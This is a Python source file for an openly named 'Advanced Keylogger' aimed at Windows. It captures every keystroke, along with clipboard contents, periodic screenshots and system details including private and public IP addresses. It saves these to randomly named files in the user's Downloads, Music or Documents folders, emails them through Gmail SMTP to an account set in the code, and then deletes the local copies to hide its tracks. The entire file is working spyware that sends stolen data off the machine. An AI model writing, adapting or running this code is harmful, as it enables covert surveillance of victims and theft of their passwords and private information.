#imports
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import requests
import platform
import os

import time
import random

from PIL import ImageGrab
import win32clipboard

from pynput.keyboard import Key, Listener
import threading


datetime = time.ctime(time.time())
user = os.path.expanduser('~').split('\\')[2]
privateIP = socket.gethostbyname(socket.gethostname())

default_msg = f" [***** LOG FILE *****]\n # Date/Time: {datetime}\n # User-Profile: {user}\n # Processor: {platform.processor()}\n # System: {platform.system()} {platform.version()}\n # Machine: {platform.machine()}\n # Hostname: {socket.gethostname()}\n # Private IP: {privateIP}\n"
try:
    publicIP = requests.get('https://api.ipify.org/').text
    default_msg = default_msg + f" # Public IP: {publicIP}\n\n\n"
except:
    default_msg = default_msg + "\n\n"
    pass

logged_data = []
logged_data.append(default_msg)

delete_file = []

EMAIL_ADDRESS = "your_email@gmail.com"
EMAIL_PASSWORD = "your_password OR Token"

count = 1


def on_press(key):
    substitution = ['Key.enter', '[ENTER]\n', 'Key.backspace', '[BACKSPACE]', 'Key.space', ' ',
	'Key.alt_l', '[ALT]', 'Key.tab', '[TAB]', 'Key.delete', '[DEL]', 'Key.ctrl_l', '[CTRL]', 
	'Key.left', '[LEFT ARROW]', 'Key.right', '[RIGHT ARROW]', 'Key.shift', '[SHIFT]', '\\x13', 
	'[CTRL-S]', '\\x17', '[CTRL-W]', 'Key.caps_lock', '[CAPS LK]', '\\x01', '[CTRL-A]', 'Key.cmd', 
	'[WINDOWS KEY]', 'Key.print_screen', '[PRNT SCR]', '\\x03', '[CTRL-C]', '\\x16', '[CTRL-V]']
    
    key = str(key).strip("'")
    if key in substitution:
        logged_data.append(substitution[substitution.index(key) + 1])
    else:
        logged_data.append(key)


def on_release(key):
    if key == Key.esc:
        return False


def send_email():
    subject = f"[{user}] ~ Logs"
    msg = MIMEMultipart()
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = EMAIL_ADDRESS
    msg['Subject'] = subject
    body = 'Advanced Keylogger\n\nPFA:\n\t1) Log File\n\t2) Clipboard Data\n\t3) Current Screenshot\n'
    msg.attach(MIMEText(body, 'plain'))
    
    for file in delete_file:
        filename = file.split('/')[2]
        attachment = open(file, 'rb')
        
        p = MIMEBase('application', 'octet-stream')
        p.set_payload((attachment).read())
        encoders.encode_base64(p)
        p.add_header('content-disposition', 'attachment;filename='+str(filename))
        msg.attach(p)
    
    text = msg.as_string()
    
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.ehlo()
    server.starttls()
    server.ehlo()
    server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
    server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, text)
    
    attachment.close()
    server.quit()


def random_file_path():
    one = os.path.expanduser('~') + '/Downloads/'
    two = os.path.expanduser('~') + '/Music/'
    three = os.path.expanduser('~') + '/Documents/'
    
    list = [one, two, three]
    filepath = random.choice(list)
    
    return filepath


def clipboard():
    filepath = random_file_path()
    filename = str(count) + 'l' + str(random.randint(1000000000, 9999999999)) + '.txt'
    
    file = filepath + filename
    delete_file.append(file)
    
    with open(file, 'a') as f:
        try:
            win32clipboard.OpenClipboard()
            copied_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            
            f.write('[##### Clipboard Data #####]\n\n' + copied_data)
            
        except:
            f.write('[Clipboard Data either empty or could not be copied.]')


def screenshot():
    filepath = random_file_path()
    filename = str(count) + 'l' + str(random.randint(1000000000, 9999999999)) + '.png'
    
    file = filepath + filename
    delete_file.append(file)
    
    im = ImageGrab.grab()
    im.save(file)
     


def log_file():
    filepath = random_file_path()
    filename = str(count) + 'l' + str(random.randint(1000000000, 9999999999)) + '.txt'
    
    file = filepath + filename
    delete_file.append(file)
    
    with open(file, 'w') as f:
        f.write(''.join(logged_data))


def send_logs():
    global count
    
    time.sleep(30)
    while True:
        if len(logged_data) > 1:
            try:
                log_file()
                clipboard()
                screenshot()
                
                send_email()
                
                for file in delete_file:
                    os.remove(file)
                    
                del logged_data[1:]
                del delete_file[0:]
                
                count += 1
            
            except:
                print('error in sending log\n')
                pass


if __name__ == '__main__':
    t = threading.Thread(target=send_logs, daemon=True)
    t.start()
    
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    
    for file in delete_file:
        os.remove(file)
        
    
    
    
